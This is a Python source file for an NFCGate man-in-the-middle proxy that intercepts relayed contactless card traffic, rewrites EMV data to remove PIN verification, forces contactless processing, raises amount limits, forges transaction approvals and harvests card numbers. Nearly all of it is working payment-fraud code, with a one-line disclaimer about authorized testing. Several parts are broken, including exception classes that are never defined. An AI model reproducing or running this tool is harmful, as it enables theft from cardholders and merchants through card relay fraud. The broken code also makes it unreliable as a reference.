#!/usr/bin/env python3
"""
MITM NFCGate PIN Bypass System
Specialized Man-in-the-Middle for NFCGate card processing without PIN validation
"""

import json
import socket
import threading
import time
import struct
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
import hashlib
import uuid
import secrets
import sys
import os
from pathlib import Path

# Add project src to path (adjust if needed)
project_root = Path(__file__).parent / 'src'
sys.path.insert(0, str(project_root))

from mitm.bypass_engine import bypass_tlv_modifications, get_comprehensive_card_info
from protocols.nfc_handler import handle_nfc_data
from core.crypto_handler import load_or_generate_private_key, sign_data
from core.tlv_parser import parse_tlv, build_tlv, is_valid_tlv
from protocols.c2c_pb2 import NFCData
from protocols.metaMessage_pb2 import Wrapper
from database.payment_db import PaymentDatabase  # Assuming this exists for logging
from nfcgate_launcher import NFCGateLauncher  # For GUI/admin integration


def add_signature_to_tlvs(tlvs: Dict[str, bytes], signature: bytes) -> Dict[str, bytes]:
    """
    Add the signature to the TLV structure using EMV tag 9F4B (Signed Dynamic Application Data).
    Assumes tlvs is a dict {tag: str -> value: bytes}.
    """
    tlvs['9F4B'] = signature
    return tlvs


class NFCGateMITM:
    """
    Advanced MITM system specifically for NFCGate card processing
    Automatically bypasses PIN validation for seamless card transactions
    """

    def __init__(self,
                 mitm_port: int = 8080,
                 nfcgate_host: str = 'localhost',
                 nfcgate_port: int = 5566):

        self.mitm_port = mitm_port
        self.nfcgate_host = nfcgate_host
        self.nfcgate_port = nfcgate_port

        # MITM Control Settings
        self.enable_pin_bypass = True
        self.auto_approve_contactless = True
        self.override_amount_limits = True
        self.force_contactless_mode = True
        self.inject_success_responses = True
        self.log_card_transactions = True

        # NFC-specific patterns
        self.nfc_patterns = {
            'pin_request': [
                b'PIN_REQUIRED',
                b'ENTER_PIN',
                b'pin_verification',
                b'cardholder_verification',
                b'CVM_PIN',
                b'PIN_VERIFY'
            ],
            'contactless_data': [
                b'contactless',
                b'tap_payment',
                b'nfc_transaction',
                b'proximity_payment',
                b'emv_contactless'
            ],
            'amount_limits': [
                b'amount_limit',
                b'transaction_limit',
                b'contactless_limit',
                b'pin_required_amount'
            ]
        }

        # Card processing statistics
        self.statistics = {
            'cards_processed': 0,
            'pins_bypassed': 0,
            'amounts_modified': 0,
            'contactless_forced': 0,
            'transactions_approved': 0,
            'start_time': None
        }

        # Session tracking
        self.active_sessions = {}
        self.intercepted_cards = []
        self.bypass_log = []

        self.is_running = False
        self.mitm_socket = None

        self.private_key = load_or_generate_private_key('keys/private.pem')
        self.state = {'bypass_pin': True, 'cdcvm_enabled': True}  # From main.py
        self.db = PaymentDatabase('database/payments.db')  # Integrate DB

    def enhanced_bypass(self, data: bytes) -> bytes:
        """Advanced TLV/protobuf bypass using project logic"""
        try:
            wrapper = Wrapper()
            consumed = wrapper.ParseFromString(data)
            if consumed is None:
                raise ProtobufInvalidError("ParseFromString returned None")
            if consumed != len(data):
                raise ProtobufTruncatedError("Incomplete Wrapper message")
            if wrapper.HasField('NFCData'):
                nfc_data = wrapper.NFCData
                if is_valid_tlv(nfc_data.data):
                    tlvs = parse_tlv(nfc_data.data)
                    card_info = get_comprehensive_card_info(tlvs)
                    modified_tlvs = bypass_tlv_modifications(tlvs, card_info['brand'], 'POS', self.state)
                    if modified_tlvs:
                        unsigned = build_tlv(modified_tlvs)
                        signature = sign_data(unsigned, self.private_key)
                        signed_tlvs = add_signature_to_tlvs(modified_tlvs, signature)
                        modified_data = build_tlv(signed_tlvs)
                        nfc_data.data = modified_data
                        # Log to DB
                        self.db.save_transaction(card_info)  # Example
                        return wrapper.SerializeToString()
        except (ProtobufTruncatedError, ProtobufInvalidError) as e:
            raise  # Propagate to forwarding logic
        except Exception:
            # Fallback for non-protobuf/JSON, e.g., simulation data
            try:
                json_data = json.loads(data.decode('utf-8'))
                if 'test' in json_data:  # Handle simulation
                    json_data['response'] = 'simulated_success'
                    return json.dumps(json_data).encode('utf-8')
            except:
                pass
        return data  # Ultimate fallback

    def log_bypass_event(self, event_type: str, card_data: Dict, details: Dict = None):
        """Log PIN bypass events"""
        if details is None:
            details = {}
        bypass_entry = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'card_data': card_data,
            'details': details,
            'session_id': str(uuid.uuid4())[:8]
        }

        self.bypass_log.append(bypass_entry)

        if self.log_card_transactions:
            summary = details.get('summary', 'Event logged') if isinstance(details, dict) else 'Event logged'
            print(f"[NFCGate-MITM] {event_type}: {summary}")

    def extract_card_info(self, data: bytes) -> Dict:
        """Extract card information from NFC data"""
        try:
            card_info = {
                'raw_data': data.hex(),
                'length': len(data),
                'extracted_at': datetime.now().isoformat()
            }

            # Try to extract PAN from various formats
            data_str = data.decode('ascii', errors='ignore')

            # Look for card numbers (13-19 digits)
            pan_patterns = [
                r'\b([4-6]\d{15}|\d{15})\b',  # Visa, MC, etc
                r'\b(3[47]\d{13})\b',  # AMEX
                r'\b(5[1-5]\d{14})\b',  # MasterCard
                r'\b(4\d{15})\b'  # Visa
            ]

            for pattern in pan_patterns:
                matches = re.findall(pattern, data_str)
                if matches:
                    card_info['pan'] = matches[0]
                    card_info['brand'] = self.detect_card_brand(matches[0])
                    break

            # Check if this looks like contactless data
            card_info['is_contactless'] = any(
                pattern in data for pattern in self.nfc_patterns['contactless_data']
            )

            # Check for PIN requirements
            card_info['pin_required'] = any(
                pattern in data for pattern in self.nfc_patterns['pin_request']
            )

            return card_info

        except Exception as e:
            return {
                'error': str(e),
                'raw_data': data.hex(),
                'length': len(data)
            }

    def detect_card_brand(self, pan: str) -> str:
        """Detect card brand from PAN"""
        if pan.startswith('4'):
            return 'Visa'
        elif pan.startswith(('51', '52', '53', '54', '55')):
            return 'MasterCard'
        elif pan.startswith(('34', '37')):
            return 'American Express'
        elif pan.startswith('6'):
            return 'Discover'
        else:
            return 'Unknown'

    def bypass_pin_validation(self, data: bytes) -> Tuple[bytes, bool]:
        """Apply bypass logic and determine if data should be forwarded."""
        try:
            modified_data = self.enhanced_bypass(data)
            return modified_data, True
        except (ProtobufTruncatedError, ProtobufInvalidError):
            raise
        except Exception as e:
            self.log_bypass_event('BYPASS_ERROR', {'error': str(e)})
            return data, False

    def create_pin_bypass_response(self, original_data: bytes) -> bytes:
        """Create a response that bypasses PIN validation"""
        try:
            # Try to parse as JSON first
            try:
                data_str = original_data.decode('utf-8')
                if data_str.strip().startswith('{'):
                    json_data = json.loads(data_str)

                    # Modify JSON to bypass PIN
                    json_data['pin_required'] = False
                    json_data['cardholder_verification'] = 'NONE'
                    json_data['cvm_method'] = 'NO_CVM'
                    json_data['contactless_approved'] = True

                    return json.dumps(json_data).encode('utf-8')
            except:
                pass

            # Create a simple approval response
            approval_response = {
                'status': 'APPROVED',
                'pin_verification': 'BYPASSED',
                'transaction_approved': True,
                'contactless_limit_waived': True,
                'cardholder_verification': 'NOT_REQUIRED',
                'mitm_bypass': True,
                'timestamp': datetime.now().isoformat()
            }

            return json.dumps(approval_response).encode('utf-8')

        except Exception as e:
            # Fallback: return simple approval bytes
            return b'APPROVED_NO_PIN_REQUIRED'

    def force_contactless_processing(self, data: bytes) -> bytes:
        """Force transaction to be processed as contactless (no PIN)"""
        try:
            # Replace PIN-related fields
            data_str = data.decode('utf-8', errors='ignore')

            # Replace PIN requirements with contactless approval
            modifications = {
                'pin_required': 'false',
                'PIN_REQUIRED': 'CONTACTLESS_APPROVED',
                'ENTER_PIN': 'NO_PIN_NEEDED',
                'cardholder_verification': 'NONE',
                'CVM_PIN': 'CVM_NONE',
                'chip_transaction': 'contactless_transaction'
            }

            for old_value, new_value in modifications.items():
                data_str = data_str.replace(old_value, new_value)

            return data_str.encode('utf-8', errors='ignore')

        except:
            return data

    def override_transaction_limits(self, data: bytes) -> bytes:
        """Override transaction amount limits for contactless"""
        try:
            data_str = data.decode('utf-8', errors='ignore')

            # Override common limit fields
            limit_overrides = {
                'contactless_limit': '999999.99',
                'pin_required_amount': '999999.99',
                'transaction_limit': '999999.99',
                'amount_limit': '999999.99'
            }

            for limit_field, new_value in limit_overrides.items():
                # JSON format replacement
                pattern = fr'"{limit_field}":\s*[\d.]+'
                replacement = f'"{limit_field}": {new_value}'
                data_str = re.sub(pattern, replacement, data_str)

                # Simple key=value format
                pattern = fr'{limit_field}=[\d.]+'
                replacement = f'{limit_field}={new_value}'
                data_str = re.sub(pattern, replacement, data_str)

            return data_str.encode('utf-8', errors='ignore')

        except:
            return data

    def is_transaction_response(self, data: bytes) -> bool:
        """Check if data is a transaction response that can be auto-approved"""
        try:
            data_str = data.decode('utf-8', errors='ignore').lower()

            response_indicators = [
                'transaction',
                'payment',
                'approval',
                'declined',
                'status',
                'result'
            ]

            return any(indicator in data_str for indicator in response_indicators)

        except:
            return False

    def create_approval_response(self, original_data: bytes) -> bytes:
        """Create an automatic approval response"""
        try:
            # Try to parse and modify existing response
            try:
                data_str = original_data.decode('utf-8')
                if data_str.strip().startswith('{'):
                    json_data = json.loads(data_str)

                    # Force approval
                    json_data['status'] = 'APPROVED'
                    json_data['transaction_approved'] = True
                    json_data['decline_reason'] = None
                    json_data['approval_code'] = f"MITM{secrets.token_hex(3).upper()}"
                    json_data['pin_bypass_applied'] = True

                    return json.dumps(json_data).encode('utf-8')
            except:
                pass

            # Create new approval response
            approval = {
                'status': 'APPROVED',
                'transaction_id': f"MITM-{int(time.time())}-{secrets.token_hex(2).upper()}",
                'approval_code': f"BYPASS{secrets.token_hex(2).upper()}",
                'transaction_approved': True,
                'pin_verification': 'BYPASSED',
                'contactless_processing': True,
                'amount_approved': True,
                'mitm_auto_approval': True,
                'timestamp': datetime.now().isoformat()
            }

            return json.dumps(approval).encode('utf-8')

        except:
            return b'{"status": "APPROVED", "pin_bypass": true}'

    def forward_with_bypass(self, source: socket.socket, destination: socket.socket, direction: str):
        buffer = b''
        while self.is_running:
            try:
                data = source.recv(4096)
                if not data:
                    break
                buffer += data
                pos = 0
                while pos + 5 <= len(buffer):  # Min header size: 4B len + 1B session
                    msg_len = int.from_bytes(buffer[pos:pos + 4], 'big')
                    session_byte = buffer[pos + 4]  # 1B session ID
                    if msg_len == 0:
                        # Special case for disconnect or empty
                        destination.send(buffer[pos:pos + 5])  # Forward as-is
                        pos += 5
                        continue
                    if pos + 5 + msg_len > len(buffer):
                        break  # Incomplete; wait
                    message_data = buffer[pos + 5: pos + 5 + msg_len]  # Extract protobuf data
                    try:
                        # Parse Wrapper from message_data
                        wrapper = Wrapper()
                        consumed = wrapper.ParseFromString(message_data)
                        if consumed != len(message_data):
                            raise ProtobufTruncatedError("Incomplete Wrapper message")
                        # Process (only modify if NFCData with valid TLV; else forward original message_data)
                        if wrapper.HasField('NFCData') and is_valid_tlv(wrapper.NFCData.data):
                            modified_data = self.enhanced_bypass(
                                message_data)  # Pass full message_data, but enhanced_bypass operates on it
                        else:
                            modified_data = message_data  # No change for non-NFCData
                        # Repack with updated length and original session
                        new_len = len(modified_data)
                        header = int.to_bytes(new_len, 4, 'big') + bytes([session_byte])
                        destination.send(header + modified_data)
                    except (ProtobufTruncatedError, ProtobufInvalidError) as e:
                        self.log_bypass_event('PROTO_ERROR', {}, {'error': str(e), 'direction': direction,
                                                                  'summary': 'Protocol error - skipping byte'})
                        pos += 1  # Recover by advancing
                    except Exception as e:
                        self.log_bypass_event('PROCESS_ERROR', {}, {'error': str(e), 'direction': direction,
                                                                    'summary': 'Processing error - skipping byte'})
                        pos += 1  # Recover instead of break
                    else:
                        pos += 5 + msg_len  # Advance past full message
                buffer = buffer[pos:]
                if len(buffer) > 1024 * 1024:  # Anti-DoS
                    raise Exception("Buffer overflow")
            except socket.timeout:
                continue
            except Exception as e:
                self.log_bypass_event('FORWARDING_ERROR', {},
                                      {'error': str(e), 'direction': direction, 'summary': 'Forwarding error'})
                break

    def handle_nfcgate_connection(self, client_socket: socket.socket, client_address: Tuple[str, int]):
        """Handle connection to NFCGate with PIN bypass and bidirectional buffering"""
        session_id = str(uuid.uuid4())[:8]
        self.active_sessions[session_id] = {
            'client_address': client_address,
            'start_time': datetime.now(),
            'cards_processed': 0,
            'pins_bypassed': 0
        }

        nfcgate_socket = None

        try:
            # Connect to actual NFCGate server
            nfcgate_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            nfcgate_socket.connect((self.nfcgate_host, self.nfcgate_port))

            self.log_bypass_event('SESSION_STARTED', {
                'session_id': session_id,
                'client': f"{client_address[0]}:{client_address[1]}"
            }, {
                                      'summary': f'MITM session started for {client_address[0]}'
                                  })

            # Start bidirectional forwarding with buffering
            client_to_nfcgate = threading.Thread(
                target=self.forward_with_bypass,
                args=(client_socket, nfcgate_socket, 'CLIENT_TO_NFCGATE'),
                daemon=True
            )
            nfcgate_to_client = threading.Thread(
                target=self.forward_with_bypass,
                args=(nfcgate_socket, client_socket, 'NFCGATE_TO_CLIENT'),
                daemon=True
            )

            client_to_nfcgate.start()
            nfcgate_to_client.start()

            client_to_nfcgate.join()
            nfcgate_to_client.join()

        except Exception as e:
            self.log_bypass_event('CONNECTION_ERROR', {
                'error': str(e),
                'session_id': session_id
            }, {
                                      'summary': f'Connection error in session {session_id}'
                                  })

        finally:
            # Cleanup
            try:
                if nfcgate_socket:
                    nfcgate_socket.close()
                client_socket.close()
            except:
                pass

            # Log session end
            if session_id in self.active_sessions:
                session = self.active_sessions[session_id]
                duration = datetime.now() - session['start_time']

                self.log_bypass_event('SESSION_ENDED', {
                    'session_id': session_id,
                    'duration_seconds': duration.total_seconds(),
                    'cards_processed': session['cards_processed']
                }, {
                                          'summary': f'Session {session_id} ended after {duration.total_seconds():.1f}s'
                                      })

                del self.active_sessions[session_id]

    def start_mitm_server(self):
        """Start the NFCGate MITM server"""
        self.mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.mitm_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.mitm_socket.bind(('0.0.0.0', self.mitm_port))
            self.mitm_socket.listen(10)
            self.is_running = True
            self.statistics['start_time'] = datetime.now()

            print(f"?? NFCGate MITM Server started on port {self.mitm_port}")
            print(f"?? Targeting NFCGate at {self.nfcgate_host}:{self.nfcgate_port}")
            print("???  PIN Bypass Features:")
            print(f"   - PIN Validation Bypass: {self.enable_pin_bypass}")
            print(f"   - Auto Contactless Approval: {self.auto_approve_contactless}")
            print(f"   - Amount Limit Override: {self.override_amount_limits}")
            print(f"   - Force Contactless Mode: {self.force_contactless_mode}")
            print(f"   - Auto Success Injection: {self.inject_success_responses}")

            while self.is_running:
                try:
                    self.mitm_socket.settimeout(1.0)
                    client_socket, client_address = self.mitm_socket.accept()

                    # Handle each client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_nfcgate_connection,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        print(f"? MITM Server error: {e}")
                    break

        except Exception as e:
            print(f"? Failed to start NFCGate MITM: {e}")

        finally:
            self.stop_mitm_server()

    def stop_mitm_server(self):
        """Stop the NFCGate MITM server"""
        self.is_running = False
        if self.mitm_socket:
            try:
                self.mitm_socket.close()
            except:
                pass
        print("?? NFCGate MITM Server stopped")

    def get_mitm_statistics(self) -> Dict:
        """Get MITM bypass statistics"""
        if not self.statistics['start_time']:
            return {}

        uptime = datetime.now() - self.statistics['start_time']

        return {
            'uptime_seconds': uptime.total_seconds(),
            'cards_processed': self.statistics['cards_processed'],
            'pins_bypassed': self.statistics['pins_bypassed'],
            'amounts_modified': self.statistics['amounts_modified'],
            'contactless_forced': self.statistics['contactless_forced'],
            'transactions_approved': self.statistics['transactions_approved'],
            'active_sessions': len(self.active_sessions),
            'intercepted_cards': len(self.intercepted_cards),
            'bypass_events': len(self.bypass_log)
        }

    def save_bypass_log(self, filename: str = None) -> str:
        """Save complete bypass log"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"nfcgate_mitm_bypass_log_{timestamp}.json"

        log_data = {
            'mitm_session': {
                'start_time': self.statistics['start_time'].isoformat() if self.statistics['start_time'] else None,
                'mitm_port': self.mitm_port,
                'nfcgate_target': f"{self.nfcgate_host}:{self.nfcgate_port}",
                'statistics': self.get_mitm_statistics(),
                'configuration': {
                    'bypass_pin_validation': self.bypass_pin_validation,
                    'auto_approve_contactless': self.auto_approve_contactless,
                    'override_amount_limits': self.override_amount_limits,
                    'force_contactless_mode': self.force_contactless_mode
                }
            },
            'intercepted_cards': self.intercepted_cards,
            'bypass_events': self.bypass_log,
            'active_sessions': list(self.active_sessions.values())
        }

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(log_data, f, indent=2, ensure_ascii=False)

        print(f"?? NFCGate MITM log saved to: {filename}")
        return filename


def main():
    """Main function for NFCGate MITM PIN bypass system"""
    print("=" * 80)
    print("?? NFCGATE MITM - PIN BYPASS SYSTEM")
    print("=" * 80)
    print("??  WARNING: This system bypasses PIN validation for card transactions!")
    print("???  Use responsibly and only in authorized testing environments")
    print()

    mitm = NFCGateMITM()

    try:
        while True:
            print("\n???  NFCGATE MITM CONTROL PANEL:")
            print("1. Start NFCGate MITM (PIN bypass)")
            print("2. Stop NFCGate MITM")
            print("3. Toggle PIN validation bypass")
            print("4. Toggle auto contactless approval")
            print("5. Toggle amount limit override")
            print("6. Toggle force contactless mode")
            print("7. View statistics and intercepted cards")
            print("8. Save bypass log")
            print("9. Show intercepted cards details")
            print("0. Exit")

            choice = input("\nSelect option (0-9): ").strip()

            if choice == '1':
                if not mitm.is_running:
                    print("?? Starting NFCGate MITM with PIN bypass...")
                    print(f"?? Connect your NFCGate clients to localhost:{mitm.mitm_port}")
                    print("?? All card transactions will bypass PIN validation")

                    mitm_thread = threading.Thread(target=mitm.start_mitm_server, daemon=True)
                    mitm_thread.start()
                    time.sleep(1)
                else:
                    print("??  NFCGate MITM is already running")

            elif choice == '2':
                if mitm.is_running:
                    print("?? Stopping NFCGate MITM...")
                    mitm.stop_mitm_server()
                else:
                    print("??  NFCGate MITM is not running")

            elif choice == '3':
                mitm.enable_pin_bypass = not mitm.enable_pin_bypass
                status = "ENABLED" if mitm.enable_pin_bypass else "DISABLED"
                print(f"?? PIN validation bypass: {status}")

            elif choice == '4':
                mitm.auto_approve_contactless = not mitm.auto_approve_contactless
                status = "ENABLED" if mitm.auto_approve_contactless else "DISABLED"
                print(f"? Auto contactless approval: {status}")

            elif choice == '5':
                mitm.override_amount_limits = not mitm.override_amount_limits
                status = "ENABLED" if mitm.override_amount_limits else "DISABLED"
                print(f"?? Amount limit override: {status}")

            elif choice == '6':
                mitm.force_contactless_mode = not mitm.force_contactless_mode
                status = "ENABLED" if mitm.force_contactless_mode else "DISABLED"
                print(f"?? Force contactless mode: {status}")

            elif choice == '7':
                stats = mitm.get_mitm_statistics()
                print("\n?? NFCGATE MITM STATISTICS:")
                print(f"   ??  Uptime: {stats.get('uptime_seconds', 0):.1f}s")
                print(f"   ?? Cards Processed: {stats.get('cards_processed', 0)}")
                print(f"   ?? PINs Bypassed: {stats.get('pins_bypassed', 0)}")
                print(f"   ?? Amounts Modified: {stats.get('amounts_modified', 0)}")
                print(f"   ?? Contactless Forced: {stats.get('contactless_forced', 0)}")
                print(f"   ? Transactions Auto-Approved: {stats.get('transactions_approved', 0)}")
                print(f"   ?? Active Sessions: {stats.get('active_sessions', 0)}")
                print(f"   ?? Bypass Events: {stats.get('bypass_events', 0)}")

            elif choice == '8':
                log_file = mitm.save_bypass_log()
                print(f"?? Bypass log saved: {log_file}")

            elif choice == '9':
                print("\n?? INTERCEPTED CARDS:")
                if mitm.intercepted_cards:
                    for i, card in enumerate(mitm.intercepted_cards[-10:], 1):  # Show last 10
                        brand = card.get('brand', 'Unknown')
                        pan = card.get('pan', 'Unknown')
                        masked_pan = f"****{pan[-4:]}" if len(pan) >= 4 else "****"
                        contactless = "??" if card.get('is_contactless') else "??"
                        pin_req = "??" if card.get('pin_required') else "??"

                        print(f"   {i}. {contactless} {brand} {masked_pan} {pin_req}")
                else:
                    print("   No cards intercepted yet")

            elif choice == '0':
                if mitm.is_running:
                    mitm.stop_mitm_server()
                print("?? Exiting NFCGate MITM PIN bypass system")
                break

            else:
                print("? Invalid option. Please select 0-9.")

    except KeyboardInterrupt:
        if mitm.is_running:
            mitm.stop_mitm_server()
        print("\n?? NFCGate MITM stopped by user")


if __name__ == "__main__":
    main()